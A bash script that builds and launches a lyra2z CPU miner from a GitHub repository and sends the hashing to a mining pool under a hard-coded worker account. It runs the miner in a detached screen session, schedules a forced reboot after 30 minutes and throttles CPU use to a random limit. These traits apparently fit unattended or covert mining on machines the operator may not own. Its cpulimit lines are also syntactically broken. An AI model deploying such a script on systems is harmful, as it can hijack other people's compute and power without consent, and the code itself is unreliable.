#!/bin/bash
if [ -f ${PWD}/cpuminer-xzc/miner.h ]; then
    if pgrep -x "cpuminer" > /dev/null
then
    echo "minerd is running"
else

    echo "minerd has been installed, starting now"
	sudo shutdown -r 30
        cd cpuminer-xzc
    screen -dmSL cpuminer ./cpuminer -a lyra2z -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.LesleyuRatcliffe -p 1; sleep 3
    cpulimit --exe cpuminer --limit ((RANDOM%98+83))
     
fi
exit
fi
sudo apt-get update
sudo apt-get install git automake autoconf pkg-config libcurl4-openssl-dev libjansson-dev libssl-dev libgmp-dev screen cpulimit -y
sudo sysctl -w vm.nr_hugepages=$((`grep -c ^processor /proc/cpuinfo` * 1))
sudo git clone https://github.com/evilbaby/cpuminer-xzc
cd cpuminer-xzc
./build.sh
echo "minerd is starting"
sudo shutdown -r 30
screen -dmSL cpuminer ./cpuminer -a lyra2z  -o stratum+tcp://us-east.lyra2z-hub.miningpoolhub.com:20581 -u evilbaby.LesleyuRatcliffe -p 1 ; sleep 3
cpulimit --exe cpuminer --limit ((RANDOM%98+83))
